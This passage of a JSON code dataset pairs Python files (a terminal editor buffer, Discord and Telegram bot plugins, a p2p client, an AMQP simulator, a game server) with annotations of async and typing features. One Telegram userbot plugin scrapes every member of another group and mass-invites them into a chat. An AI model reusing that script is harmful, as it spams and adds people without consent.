exit_selection(self) -> None:\n        self.selection_state = None\n    def _editor_simple_tempfile(self) -> Tuple[str, Callable[[], None]]:\n        suffix = to_str(self.tempfile_suffix)\n        descriptor, filename = tempfile.mkstemp(suffix)\n        os.write(descriptor, self.text.encode(\"utf-8\"))\n        os.close(descriptor)\n        def cleanup() -> None:\n            os.unlink(filename)\n        return filename, cleanup\n    def _editor_complex_tempfile(self) -> Tuple[str, Callable[[], None]]:\n        headtail = to_str(self.tempfile)\n        if not headtail:\n            return self._editor_simple_tempfile()\n        headtail = str(headtail)\n        head, tail = os.path.split(headtail)\n        if os.path.isabs(head):\n            head = head[1:]\n        dirpath = tempfile.mkdtemp()\n        if head:\n            dirpath = os.path.join(dirpath, head)\n        os.makedirs(dirpath)\n        filename = os.path.join(dirpath, tail)\n        with open(filename, \"w\", encoding=\"utf-8\") as fh:\n            fh.write(self.text)\n        def cleanup() -> None:\n            shutil.rmtree(dirpath)\n        return filename, cleanup\n    def open_in_editor(self, validate_and_handle: bool = False) -> \"asyncio.Task[None]\":\n        if self.read_only():\n            raise EditReadOnlyBuffer()\n        if self.tempfile:\n            filename, cleanup_func = self._editor_complex_tempfile()\n        else:\n            filename, cleanup_func = self._editor_simple_tempfile()\n        async def run() -> None:\n            try:\n                succes = await run_in_terminal(\n                    lambda: self._open_file_in_editor(filename), in_executor=True\n                )\n                if succes:\n                    with open(filename, \"rb\") as f:\n                        text = f.read().decode(\"utf-8\")\n                        if text.endswith(\"\\n\"):\n                            text = text[:-1]\n                        self.document = Document(text=text, cursor_position=len(text))\n                    if validate_and_handle:\n                        self.validate_and_handle()\n            finally:\n                cleanup_func()\n        return get_app().create_background_task(run())\n    def _open_file_in_editor(self, filename: str) -> bool:\n        visual = os.environ.get(\"VISUAL\")\n        editor = os.environ.get(\"EDITOR\")\n        editors = [\n            visual,\n            editor,\n            \"/usr/bin/editor\",\n            \"/usr/bin/nano\",\n            \"/usr/bin/pico\",\n            \"/usr/bin/vi\",\n            \"/usr/bin/emacs\",\n        ]\n        for e in editors:\n            if e:\n                try:\n                    returncode = subprocess.call(shlex.split(e) + [filename])\n                    return returncode == 0\n                except OSError:\n                    pass\n        return False\n    def start_completion(\n        self,\n        select_first: bool = False,\n        select_last: bool = False,\n        insert_common_part: bool = False,\n        complete_event: Optional[CompleteEvent] = None,\n    ) -> None:\n        assert select_first + select_last + insert_common_part <= 1\n        get_app().create_background_task(\n            self._async_completer(\n                select_first=select_first,\n                select_last=select_last,\n                insert_common_part=insert_common_part,\n                complete_event=complete_event\n                or CompleteEvent(completion_requested=True),\n            )\n        )\n    def _create_completer_coroutine(self) -> Callable[..., Awaitable[None]]:\n        def completion_does_nothing(document: Document, completion: Completion) -> bool:\n            text_before_cursor = document.text_before_cursor\n            replaced_text = text_before_cursor[\n                len(text_before_cursor) + completion.start_position :\n            ]\n            return replaced_text == completion.text\n        @_only_one_at_a_time\n        async def async_completer(\n            select_first: bool = False,\n            select_last: bool = False,\n            insert_common_part: bool = False,\n            complete_event: Optional[CompleteEvent] = None,\n        ) -> None:\n            document = self.document\n            complete_event = complete_event or CompleteEvent(text_inserted=True)\n            if self.complete_state or not self.completer:\n                return\n            complete_state = CompletionState(original_document=self.document)\n            self.complete_state = complete_state\n            def proceed() -> bool:\n                return self.complete_state == complete_state\n            async for completion in self.completer.get_completions_async(\n                document, complete_event\n            ):\n                complete_state.completions.append(completion)\n                self.on_completions_changed.fire()\n                if not proceed():\n                    break\n            completions = complete_state.completions\n            if len(completions) == 1 and completion_does_nothing(\n                document, completions[0]\n            ):\n                del completions[:]\n            if proceed():\n                if (\n                    not self.complete_state\n                    or self.complete_state.complete_index is not None\n                ):\n                    return\n                if not completions:\n                    self.complete_state = None\n                    self.on_completions_changed.fire()\n                    return\n                if select_first:\n                    self.go_to_completion(0)\n                elif select_last:\n                    self.go_to_completion(len(completions) - 1)\n                elif insert_common_part:\n                    common_part = get_common_complete_suffix(document, completions)\n                    if common_part:\n                        self.insert_text(common_part)\n                        if len(completions) > 1:\n                            completions[:] = [\n                                c.new_completion_from_position(len(common_part))\n                                for c in completions\n                            ]\n                            self._set_completions(completions=completions)\n                        else:\n                            self.complete_state = None\n                    else:\n                        if len(completions) == 1:\n                            self.go_to_completion(0)\n            else:\n                if self.document.text_before_cursor == document.text_before_cursor:\n                    return  \n                if self.document.text_before_cursor.startswith(\n                    document.text_before_cursor\n                ):\n                    raise _Retry\n        return async_completer\n    def _create_auto_suggest_coroutine(self) -> Callable[[], Awaitable[None]]:\n        @_only_one_at_a_time\n        async def async_suggestor() -> None:\n            document = self.document\n            if self.suggestion or not self.auto_suggest:\n                return\n            suggestion = await self.auto_suggest.get_suggestion_async(self, document)\n            if self.document == document:\n                self.suggestion = suggestion\n                self.on_suggestion_set.fire()\n            else:\n                raise _Retry\n        return async_suggestor\n    def _create_auto_validate_coroutine(self) -> Callable[[], Awaitable[None]]:\n        @_only_one_at_a_time\n        async def async_validator() -> None:\n            await self._validate_async()\n        return async_validator\n    def validate_and_handle(self) -> None:\n        valid = self.validate(set_cursor=True)\n        if valid:\n            if self.accept_handler:\n                keep_text = self.accept_handler(self)\n            else:\n                keep_text = False\n            self.append_to_history()\n            if not keep_text:\n                self.reset()\n_T = TypeVar(\"_T\", bound=Callable[..., Awaitable[None]])\ndef _only_one_at_a_time(coroutine: _T) -> _T:\n    running = False\n    @wraps(coroutine)\n    async def new_coroutine(*a: Any, **kw: Any) -> Any:\n        nonlocal running\n        if running:\n            return\n        running = True\n        try:\n            while True:\n                try:\n                    await coroutine(*a, **kw)\n                except _Retry:\n                    continue\n                else:\n                    return None\n        finally:\n            running = False\n    return cast(_T, new_coroutine)\nclass _Retry(Exception):\n    \"Retry in `_only_one_at_a_time`.\"\ndef indent(buffer: Buffer, from_row: int, to_row: int, count: int = 1) -> None:\n    current_row = buffer.document.cursor_position_row\n    line_range = range(from_row, to_row)\n    new_text = buffer.transform_lines(line_range, lambda l: \"    \" * count + l)\n    buffer.document = Document(\n        new_text, Document(new_text).translate_row_col_to_index(current_row, 0)\n    )\n    buffer.cursor_position += buffer.document.get_start_of_line_position(\n        after_whitespace=True\n    )\ndef unindent(buffer: Buffer, from_row: int, to_row: int, count: int = 1) -> None:\n    current_row = buffer.document.cursor_position_row\n    line_range = range(from_row, to_row)\n    def transform(text: str) -> str:\n        remove = \"    \" * count\n        if text.startswith(remove):\n            return text[len(remove) :]\n        else:\n            return text.lstrip()\n    new_text = buffer.transform_lines(line_range, transform)\n    buffer.document = Document(\n        new_text, Document(new_text).translate_row_col_to_index(current_row, 0)\n    )\n    buffer.cursor_position += buffer.document.get_start_of_line_position(\n        after_whitespace=True\n    )\ndef reshape_text(buffer: Buffer, from_row: int, to_row: int) -> None:\n    lines = buffer.text.splitlines(True)\n    lines_before = lines[:from_row]\n    lines_after = lines[to_row + 1 :]\n    lines_to_reformat = lines[from_row : to_row + 1]\n    if lines_to_reformat:\n        match = re.search(r\"^\\s*\", lines_to_reformat[0])\n        length = match.end() if match else 0  \n        indent = lines_to_reformat[0][:length].replace(\"\\n\", \"\")\n        words = \"\".join(lines_to_reformat).split()\n        width = (buffer.text_width or 80) - len(indent)\n        reshaped_text = [indent]\n        current_width = 0\n        for w in words:\n            if current_width:\n                if len(w) + current_width + 1 > width:\n                    reshaped_text.append(\"\\n\")\n                    reshaped_text.append(indent)\n                    current_width = 0\n                else:\n                    reshaped_text.append(\" \")\n                    current_width += 1\n            reshaped_text.append(w)\n            current_width += len(w)\n        if reshaped_text[-1] != \"\\n\":\n            reshaped_text.append(\"\\n\")\n        buffer.document = Document(\n            text=\"\".join(lines_before + reshaped_text + lines_after),\n            cursor_position=len(\"\".join(lines_before + reshaped_text)),\n        )",
            "patterns": {
                "pep_468": [
                    [
                        1012,
                        "coroutine(*a, **kw)"
                    ]
                ],
                "pep_526": [
                    [
                        162,
                        "self.on_text_changed: Event[\"Buffer\"] = Event(self, on_text_changed)"
                    ],
                    [
                        163,
                        "self.on_text_insert: Event[\"Buffer\"] = Event(self, on_text_insert)"
                    ],
                    [
                        164,
                        "self.on_cursor_position_changed: Event[\"Buffer\"] = Event("
                    ],
                    [
                        167,
                        "self.on_completions_changed: Event[\"Buffer\"] = Event("
                    ],
                    [
                        170,
                        "self.on_suggestion_set: Event[\"Buffer\"] = Event(self, on_suggestion_set)"
                    ],
                    [
                        171,
                        "self._document_cache: FastDictCache["
                    ],
                    [
                        177,
                        "self._load_history_task: Optional[asyncio.Future[None]] = None"
                    ],
                    [
                        192,
                        "self.validation_error: Optional[ValidationError] = None"
                    ],
                    [
                        193,
                        "self.validation_state: Optional[ValidationState] = ValidationState.UNKNOWN"
                    ],
                    [
                        194,
                        "self.selection_state: Optional[SelectionState] = None"
                    ],
                    [
                        195,
                        "self.multiple_cursor_positions: List[int] = []"
                    ],
                    [
                        196,
                        "self.preferred_column: Optional[int] = None"
                    ],
                    [
                        197,
                        "self.complete_state: Optional[CompletionState] = None"
                    ],
                    [
                        198,
                        "self.yank_nth_arg_state: Optional[YankNthArgState] = None"
                    ],
                    [
                        199,
                        "self.document_before_paste: Optional[Document] = None"
                    ],
                    [
                        200,
                        "self.suggestion: Optional[Suggestion] = None"
                    ],
                    [
                        201,
                        "self.history_search_text: Optional[str] = None"
                    ],
                    [
                        202,
                        "self._undo_stack: List[Tuple[str, int]] = []"
                    ],
                    [
                        203,
                        "self._redo_stack: List[Tuple[str, int]] = []"
                    ],
                    [
                        207,
                        "self._working_lines: Deque[str] = deque([document.text])"
                    ],
                    [
                        446,
                        "index: Optional[int]"
                    ],
                    [
                        463,
                        "index: Optional[int]"
                    ],
                    [
                        485,
                        "found_completions: Set[str] = set()"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_563": [
                    [
                        65,
                        "        original_document: \"Document\",",
                        "quoted annotation"
                    ],
                    [
                        841,
                        "    def open_in_editor(self, validate_and_handle: bool = False) -> \"asyncio.Task[None]\":",
                        "quoted annotation"
                    ],
                    [
                        216,
                        "            def load_history_done(f: \"asyncio.Future[None]\") -> None:",
                        "quoted annotation"
                    ]
                ],
                "pep_585": [
                    [
                        12,
                        "from typing import (",
                        "suggestion"
                    ],
                    [
                        12,
                        "from typing import (",
                        "suggestion"
                    ],
                    [
                        12,
                        "from typing import (",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        83,
                        "    def new_text_and_position(self) -> Tuple[str, int]:",
                        "violation"
                    ],
                    [
                        195,
                        "        self.multiple_cursor_positions: List[int] = []",
                        "violation"
                    ],
                    [
                        202,
                        "        self._undo_stack: List[Tuple[str, int]] = []",
                        "violation"
                    ],
                    [
                        203,
                        "        self._redo_stack: List[Tuple[str, int]] = []",
                        "violation"
                    ],
                    [
                        478,
                        "    def _set_completions(self, completions: List[Completion]) -> CompletionState:",
                        "violation"
                    ],
                    [
                        485,
                        "        found_completions: Set[str] = set()",
                        "violation"
                    ],
                    [
                        815,
                        "    def _editor_simple_tempfile(self) -> Tuple[str, Callable[[], None]]:",
                        "violation"
                    ],
                    [
                        823,
                        "    def _editor_complex_tempfile(self) -> Tuple[str, Callable[[], None]]:",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        923,
                        929,
                        "async for",
                        "async for completion in self.completer.get_completions_async(\n                document, complete_event\n            ):\n                complete_state.completions.append(completion)\n                self.on_completions_changed.fire()\n                if not proceed():\n                    break"
                    ],
                    [
                        212,
                        214,
                        "async for",
                        "async for item in self.history.load():\n                    self._working_lines.appendleft(item)\n                    self.__working_index += 1"
                    ]
                ],
                "pep_498v": [
                    [
                        73,
                        78,
                        "%"
                    ],
                    [
                        111,
                        116,
                        "%"
                    ],
                    [
                        184,
                        184,
                        "%"
                    ],
                    [
                        495,
                        495,
                        "%"
                    ],
                    [
                        497,
                        497,
                        "%"
                    ]
                ]
            }
        },
        "87": {
            "file": "import asyncio\nimport logging\nimport discord\nfrom discord.ext import commands\nMAX_DELETE_POSTS = 80\nlogger = logging.getLogger(__name__)\nclass Messages:\n    __slots__ = (\n        'bot',\n    )\n    def __init__(self, bot):\n        self.bot = bot\n    @staticmethod\n    async def _get_messages(channel, ids):\n        messages = []\n        async for msg in channel.history():\n            try:\n                messages.append((ids.index(msg.id), msg))\n            except ValueError:\n                pass\n        return map(lambda t: t[1], sorted(messages))\n    @commands.command()\n    async def hit(self, ctx, *, content: str = None):\n        fut = ctx.message.delete()\n        if content is not None:\n            await ctx.send(content=content, delete_after=0)\n        await fut\n    @commands.command()\n    async def delay(self, ctx, seconds: float, *, content: str):\n        logger.info(f'Queued up delayed message for {seconds} seconds from now')\n        await ctx.message.delete()\n        await asyncio.sleep(seconds)\n        logger.info(f'Posting delayed message: {content}')\n        await ctx.send(content=content)\n    @commands.command()\n    async def embed(self, ctx, *, content: str):\n        fut = ctx.message.delete()\n        embed = discord.Embed(type='rich', description=content)\n        await ctx.send(embed=embed)\n        await fut\n    @commands.command()\n    async def quote(self, ctx, id: int, cid: int = 0):\n        fut = ctx.message.delete()\n        if cid:\n            channel = self.bot.get_channel(cid)\n            if channel is None:\n                logger.warning(f'Cannot find the channel with ID {cid}')\n                return\n        else:\n            channel = ctx.channel\n        await fut\n        to_quote = await self._get_messages(channel, (id,))\n        for msg in to_quote:\n            embed = discord.Embed(type='rich', description=msg.content)\n            embed.set_author(name=msg.author.display_name, icon_url=msg.author.avatar_url)\n            embed.timestamp = msg.created_at\n            if msg.attachments:\n                urls = '\\n'.join(attach.url for attach in msg.attachments)\n                embed.add_field(name='Attachments:', value=urls)\n            await ctx.send(embed=embed)\n    @commands.command()\n    async def dump(self, ctx, *ids: int):\n        fut = ctx.message.delete()\n        to_copy = await self._get_messages(ctx.channel, ids)\n        for msg in to_copy:\n            if msg.content:\n                content = '\\n'.join((\n                    'Plain:',\n                    '```',\n                    msg.content.replace(\"`\", \"'\"),\n                    '```',\n                    '',\n                    'Chars:',\n                    '```',\n                    ' '.join(f'{ord(c):02x}' for c in msg.content),\n                    '```',\n                ))\n            else:\n                content = '(Message is empty)'\n            embed = discord.Embed(type='rich', description=content)\n            embed.set_author(name=msg.author.display_name, icon_url=msg.author.avatar_url)\n            embed.timestamp = msg.edited_at or msg.created_at\n            if msg.attachments:\n                urls = '\\n'.join(attach.url for attach in msg.attachments)\n                embed.add_field(name='Attachments:', value=urls)\n            await self.bot._send(embed=embed)\n            for embed in msg.embeds:\n                await self.bot._send(embed=embed)\n        await fut\n    @commands.command()\n    async def delet(self, ctx, posts: int = 1):\n        if posts > MAX_DELETE_POSTS:\n            logger.error((f'Asked to delete {posts} posts which is greater than '\n                          f'the self-imposed limit of {MAX_DELETE_POSTS}'))\n            return\n        fut = ctx.message.delete()\n        deleted = 0\n        async for msg in ctx.channel.history():\n            if msg.author == self.bot.user:\n                await msg.delete()\n                deleted += 1\n                if deleted >= posts + 1:\n                    break\n        await fut\n    @commands.command()\n    async def purge(self, ctx, posts: int = 1):\n        if posts > MAX_DELETE_POSTS:\n            logger.error((f'Asked to delete {posts} posts which is greater than '\n                          f'the self-imposed limit of {MAX_DELETE_POSTS}'))\n            return\n        async for msg in ctx.channel.history(limit=posts + 1):\n            try:\n                await msg.delete()\n            except discord.errors.DiscordException as ex:\n                logger.error(f'Cannot delete message {msg.id}: {ex}')",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        16,
                        20,
                        "async for",
                        "async for msg in channel.history():\n            try:\n                messages.append((ids.index(msg.id), msg))\n            except ValueError:\n                pass"
                    ],
                    [
                        98,
                        103,
                        "async for",
                        "async for msg in ctx.channel.history():\n            if msg.author == self.bot.user:\n                await msg.delete()\n                deleted += 1\n                if deleted >= posts + 1:\n                    break"
                    ],
                    [
                        111,
                        115,
                        "async for",
                        "async for msg in ctx.channel.history(limit=posts + 1):\n            try:\n                await msg.delete()\n            except discord.errors.DiscordException as ex:\n                logger.error(f'Cannot delete message {msg.id}: {ex}')"
                    ]
                ],
                "pep_498": [
                    [
                        30,
                        "        logger.info(f'Queued up delayed message for {seconds} seconds from now')"
                    ],
                    [
                        33,
                        "        logger.info(f'Posting delayed message: {content}')"
                    ],
                    [
                        93,
                        "            logger.error((f'Asked to delete {posts} posts which is greater than '"
                    ],
                    [
                        108,
                        "            logger.error((f'Asked to delete {posts} posts which is greater than '"
                    ],
                    [
                        47,
                        "                logger.warning(f'Cannot find the channel with ID {cid}')"
                    ],
                    [
                        115,
                        "                logger.error(f'Cannot delete message {msg.id}: {ex}')"
                    ],
                    [
                        75,
                        "                    ' '.join(f'{ord(c):02x}' for c in msg.content),"
                    ],
                    [
                        75,
                        "                    ' '.join(f'{ord(c):02x}' for c in msg.content),"
                    ]
                ]
            }
        },
        "88": {
            "file": "import asyncio, time, io, math, os, logging, asyncio, shutil, re, subprocess, json\nfrom hachoir.metadata import extractMetadata\nfrom hachoir.parser import createParser\nfrom base64 import b64decode\nfrom userbot.utils import admin_cmd\nfrom telethon.events import NewMessage\nfrom telethon.tl.custom import Dialog\nfrom telethon.tl.types import Channel, Chat, User\nfrom telethon.tl import functions, types\nfrom telethon.tl.functions.messages import GetHistoryRequest, CheckChatInviteRequest, GetFullChatRequest\nfrom telethon.errors import (ChannelInvalidError, ChannelPrivateError, ChannelPublicGroupNaError, InviteHashEmptyError, InviteHashExpiredError, InviteHashInvalidError)\nfrom telethon.tl.functions.channels import GetFullChannelRequest, GetParticipantsRequest\nfrom telethon.errors import FloodWaitError\nfrom time import sleep\nfrom html import unescape\nfrom urllib.parse import quote_plus\nfrom urllib.error import HTTPError\nfrom telethon import events\nfrom requests import get\nfrom html import unescape\nfrom re import findall\nfrom asyncio import sleep\nfrom telethon.errors.rpcerrorlist import YouBlockedUserError\nimport random\nasync def get_chatinfo(event):\n    chat = event.pattern_match.group(1)\n    chat_info = None\n    if chat:\n        try:\n            chat = int(chat)\n        except ValueError:\n            pass\n    if not chat:\n        if event.reply_to_msg_id:\n            replied_msg = await event.get_reply_message()\n            if replied_msg.fwd_from and replied_msg.fwd_from.channel_id is not None:\n                chat = replied_msg.fwd_from.channel_id\n        else:\n            chat = event.chat_id\n    try:\n        chat_info = await event.client(GetFullChatRequest(chat))\n    except:\n        try:\n            chat_info = await event.client(GetFullChannelRequest(chat))\n        except ChannelInvalidError:\n            await event.reply(\"`Invalid channel/group`\")\n            return None\n        except ChannelPrivateError:\n            await event.reply(\"`This is a private channel/group or I am banned from there`\")\n            return None\n        except ChannelPublicGroupNaError:\n            await event.reply(\"`Channel or supergroup doesn't exist`\")\n            return None\n        except (TypeError, ValueError) as err:\n            await event.reply(\"`Invalid channel/group`\")\n            return None\n    return chat_info\ndef user_full_name(user):\n    names = [user.first_name, user.last_name]\n    names = [i for i in list(names) if i]\n    full_name = ' '.join(names)\n    return full_name\n@borg.on(admin_cmd(pattern=r\"inviteall ?(.*)\"))\nasync def get_users(event):   \n    sender = await event.get_sender() ; me = await event.client.get_me()\n    if not sender.id == me.id:\n        hell = await event.reply(\"`processing...`\")\n    else:\n    \thell = await event.edit(\"`processing...`\")\n    kraken = await get_chatinfo(event) ; chat = await event.get_chat()\n    if event.is_private:\n              return await hell.edit(\"`Sorry, Can add users here`\")    \n    s = 0 ; f = 0 ; error = 'None'   \n    await hell.edit(\"**TerminalStatus**\\n\\n`Collecting Users.......`\")\n    async for user in event.client.iter_participants(kraken.full_chat.id):\n                try:\n                    if error.startswith(\"Too\"):\n                        return await hell.edit(f\"**Terminal Finished With Error**\\n(`May Got Limit Error from telethon Please try agin Later`)\\n**Error** : \\n`{error}`\\n\\n\u2022 Invited `{s}` people \\n\u2022 Failed to Invite `{f}` people\")\n                    await event.client(functions.channels.InviteToChannelRequest(channel=chat,users=[user.id]))\n                    s = s + 1                                                    \n                    await hell.edit(f\"**Terminal Running...**\\n\\n\u2022 Invited `{s}` people \\n\u2022 Failed to Invite `{f}` people\\n\\n**\u00d7 LastError:** `{error}`\")                \n                except Exception as e:\n                    error = str(e) ; f = f + 1             \n    return await hell.edit(f\"**Terminal Finished** \\n\\n\u2022 Successfully Invited `{s}` people \\n\u2022 failed to invite `{f}` people\")",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio, time, io, math, os, logging, asyncio, shutil, re, subprocess, json"
                    ],
                    [
                        1,
                        1,
                        "import",
                        "import asyncio, time, io, math, os, logging, asyncio, shutil, re, subprocess, json"
                    ],
                    [
                        22,
                        22,
                        "import",
                        "from asyncio import sleep"
                    ]
                ],
                "pep_525": [
                    [
                        75,
                        83,
                        "async for",
                        "async for user in event.client.iter_participants(kraken.full_chat.id):\n                try:\n                    if error.startswith(\"Too\"):\n                        return await hell.edit(f\"**Terminal Finished With Error**\\n(`May Got Limit Error from telethon Please try agin Later`)\\n**Error** : \\n`{error}`\\n\\n\u2022 Invited `{s}` people \\n\u2022 Failed to Invite `{f}` people\")\n                    await event.client(functions.channels.InviteToChannelRequest(channel=chat,users=[user.id]))\n                    s = s + 1                                                    \n                    await hell.edit(f\"**Terminal Running...**\\n\\n\u2022 Invited `{s}` people \\n\u2022 Failed to Invite `{f}` people\\n\\n**\u00d7 LastError:** `{error}`\")                \n                except Exception as e:\n                    error = str(e) ; f = f + 1"
                    ]
                ],
                "pep_498": [
                    [
                        84,
                        "    return await hell.edit(f\"**Terminal Finished** \\n\\n\u2022 Successfully Invited `{s}` people \\n\u2022 failed to invite `{f}` people\")"
                    ],
                    [
                        81,
                        "                    await hell.edit(f\"**Terminal Running...**\\n\\n\u2022 Invited `{s}` people \\n\u2022 Failed to Invite `{f}` people\\n\\n**\u00d7 LastError:** `{error}`\")                "
                    ],
                    [
                        78,
                        "                        return await hell.edit(f\"**Terminal Finished With Error**\\n(`May Got Limit Error from telethon Please try agin Later`)\\n**Error** : \\n`{error}`\\n\\n\u2022 Invited `{s}` people \\n\u2022 Failed to Invite `{f}` people\")"
                    ]
                ]
            }
        },
        "89": {
            "file": "import asyncio\nfrom contextlib import asynccontextmanager\nfrom typing import AsyncIterator, Iterable, Sequence, Tuple\nfrom multiaddr import Multiaddr\nfrom hivemind.p2p.p2p_daemon_bindings.control import ControlClient, DaemonConnector, StreamHandler, TUnaryHandler\nfrom hivemind.p2p.p2p_daemon_bindings.datastructures import PeerID, PeerInfo, StreamInfo\nclass Client:\n    control: ControlClient\n    def __init__(self, *, _initialized_with_create=False) -> None:\n        assert _initialized_with_create, \"Please use Client.create coroutine to spawn new client instances\"\n        self.control = None\n    @classmethod\n    async def create(cls, control_maddr: Multiaddr = None, listen_maddr: Multiaddr = None) -> \"Client\":\n        client = cls(_initialized_with_create=True)\n        daemon_connector = DaemonConnector(control_maddr=control_maddr)\n        client.control = await ControlClient.create(daemon_connector=daemon_connector, listen_maddr=listen_maddr)\n        return client\n    def close(self) -> None:\n        self.control.close()\n    def __del__(self):\n        self.close()\n    @asynccontextmanager\n    async def listen(self) -> AsyncIterator[\"Client\"]:\n        async with self.control.listen():\n            yield self\n    async def add_unary_handler(self, proto: str, handler: TUnaryHandler):\n        await self.control.add_unary_handler(proto, handler)\n    async def call_unary_handler(self, peer_id: PeerID, proto: str, data: bytes) -> bytes:\n        return await self.control.call_unary_handler(peer_id, proto, data)\n    async def identify(self) -> Tuple[PeerID, Tuple[Multiaddr, ...]]:\n        return await self.control.identify()\n    async def connect(self, peer_id: PeerID, maddrs: Iterable[Multiaddr]) -> None:\n        await self.control.connect(peer_id=peer_id, maddrs=maddrs)\n    async def list_peers(self) -> Tuple[PeerInfo, ...]:\n        return await self.control.list_peers()\n    async def disconnect(self, peer_id: PeerID) -> None:\n        await self.control.disconnect(peer_id=peer_id)\n    async def stream_open(\n        self, peer_id: PeerID, protocols: Sequence[str]\n    ) -> Tuple[StreamInfo, asyncio.StreamReader, asyncio.StreamWriter]:\n        return await self.control.stream_open(peer_id=peer_id, protocols=protocols)\n    async def stream_handler(self, proto: str, handler_cb: StreamHandler) -> None:\n        await self.control.stream_handler(proto=proto, handler_cb=handler_cb)",
            "patterns": {
                "pep_526": [
                    [
                        8,
                        "control: ControlClient"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_563": [
                    [
                        13,
                        "    async def create(cls, control_maddr: Multiaddr = None, listen_maddr: Multiaddr = None) -> \"Client\":",
                        "quoted annotation"
                    ]
                ],
                "pep_585": [
                    [
                        3,
                        "from typing import AsyncIterator, Iterable, Sequence, Tuple",
                        "suggestion"
                    ]
                ],
                "pep_525": [
                    [
                        23,
                        25,
                        "async generator",
                        "async def listen(self) -> AsyncIterator[\"Client\"]:\n        async with self.control.listen():\n            yield self"
                    ]
                ]
            }
        },
        "90": {
            "file": "import click\nimport os\nimport asyncio\nimport json\nfrom aio_pika import connect, Message, DeliveryMode, ExchangeType\nimport numpy as np\nimport logging\nlogger = logging.getLogger(__name__)\nfrom .utils import fixedclock, asyncretry, forever, asyncrun\n@asyncretry(delay=5, attempts=forever)\nasync def send_queue_to_amqp(meter_queue, url, exchange):\n    connection = await connect(url)\n    logger.info(\"Connection established\")\n    async with connection:\n        channel = await connection.channel()\n        logger.info(\"Channel opened\")\n        meter_exchange = await channel.declare_exchange(\n            exchange,\n            ExchangeType.FANOUT\n        )\n        logger.info(f\"'{exchange}' exchange declared.\")\n        logger.info(\"Starting sending of random meter values...\")\n        while True:\n            time, meter = await meter_queue.get()\n            logger.debug(f\"Sending meter value {meter}\")\n            message = Message(\n                timestamp=time,\n                body=json.dumps(meter, ensure_ascii=False).encode(),\n                content_type='application/json'\n            )\n            await asyncio.shield(\n                meter_exchange.publish(message, routing_key=\"\")\n            )\n            meter_queue.task_done()\ndef get_meter_value():\n    return 9000 * np.random.random()\nasync def read_meter_values(meter_queue, realtime):\n    async for time in fixedclock(rate=1, realtime=realtime):\n        meter = get_meter_value()\n        await meter_queue.put((time, meter))\nasync def _metersim(amqp_url, exchange, realtime):\n    meter_queue = asyncio.Queue()\n    gathered_tasks = asyncio.gather(\n        read_meter_values(meter_queue, realtime),\n        send_queue_to_amqp(meter_queue, amqp_url, exchange)\n    )\n    try:\n        await gathered_tasks\n    finally:\n        gathered_tasks.cancel()\n        if not meter_queue.empty():\n            logger.warn(f\"{meter_queue.qsize()} undelivered meter_values have been lost\")\n@click.command()\n@click.option('--amqp-url', default=os.environ.get(\"AMQP_URL\"),\n              help=\"AMQP URL (defaults to 'amqp://localhost:5672/')\")\n@click.option('--exchange', default=os.environ.get(\"TMHPVSIM_EXCHANGE\", 'meter'),\n              help=\"The name of the exchange (defaults to 'meter')\")\n@click.option('-v', '--verbose', count=True,\n              help=\"Increase logging level from default WARN\")\n@click.option('--realtime/--no-realtime', default=True,\n              help=\"Switch off rate limiting (for simulation)\")\ndef metersim(amqp_url, exchange, verbose, realtime):\n    logging.basicConfig(level=logging.WARN - 10 * verbose)\n    return asyncrun(_metersim(amqp_url, exchange, realtime))",
            "patterns": {
                "pep_567": [
                    [
                        3,
                        3,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        38,
                        40,
                        "async for",
                        "async for time in fixedclock(rate=1, realtime=realtime):\n        meter = get_meter_value()\n        await meter_queue.put((time, meter))"
                    ]
                ],
                "pep_498": [
                    [
                        21,
                        "        logger.info(f\"'{exchange}' exchange declared.\")"
                    ],
                    [
                        25,
                        "            logger.debug(f\"Sending meter value {meter}\")"
                    ],
                    [
                        52,
                        "            logger.warn(f\"{meter_queue.qsize()} undelivered meter_values have been lost\")"
                    ]
                ]
            }
        },
        "91": {
            "file": "import argparse\nimport asyncio\nimport json\nimport logging\nimport os.path\nimport random\nfrom collections import namedtuple\nfrom functools import reduce\nfrom operator import add\nimport requests\nfrom requests import RequestException\nimport websockets\nfrom game import Game\nlogging.basicConfig(\n    level=logging.DEBUG, format=\"%(asctime)s - %(name)s - %(levelname)s - %(message)s\"\n)\nwslogger = logging.getLogger(\"websockets\")\nwslogger.setLevel(logging.WARN)\nlogger = logging.getLogger(\"Server\")\nlogger.setLevel(logging.INFO)\nPlayer = namedtuple(\"Player\", [\"name\", \"ws\"])\nHIGHSCORE_FILE = \"highscores.json\"\nMAX_HIGHSCORES = 10\nclass GameServer:\n    def __init__(self, level, timeout, seed=0, grading=None):\n        self.seed = seed\n        self.game = Game()\n        self.players = asyncio.Queue()\n        self.viewers = set()\n        self.current_player = None\n        self.grading = grading\n        self._level = level  \n        self._timeout = timeout  \n        self._highscores = []\n        if os.path.isfile(HIGHSCORE_FILE):\n            with open(HIGHSCORE_FILE, \"r\") as infile:\n                self._highscores = json.load(infile)\n                print(self._highscores)\n    def save_highscores(self, score):\n        logger.debug(\"Save highscores\")\n        logger.info(\n            \"%s FINAL SCORE <%s>\",\n            self.current_player.name,\n            score,\n        )\n        self._highscores.append((self.current_player.name, score))\n        self._highscores = sorted(self._highscores, key=lambda s: s[1], reverse=True)[\n            :MAX_HIGHSCORES\n        ]\n        print(self._highscores)\n        with open(HIGHSCORE_FILE, \"w\") as outfile:\n            json.dump(self._highscores, outfile)\n    async def send_info(self, game_info, highscores=False):\n        if highscores:\n            game_info[\"highscores\"] = self._highscores\n            game_info[\"player\"] = self.current_player.name\n        if self.viewers:\n            await asyncio.wait(\n                [client.send(json.dumps(game_info)) for client in self.viewers]\n            )\n        await self.current_player.ws.send(json.dumps(game_info))\n    async def incomming_handler(self, websocket, path):\n        try:\n            async for message in websocket:\n                data = json.loads(message)\n                if not \"cmd\" in data:\n                    continue\n                if data[\"cmd\"] == \"join\":\n                    if path == \"/player\":\n                        logger.info(\"<%s> has joined\", data[\"name\"])\n                        await self.players.put(Player(data[\"name\"], websocket))\n 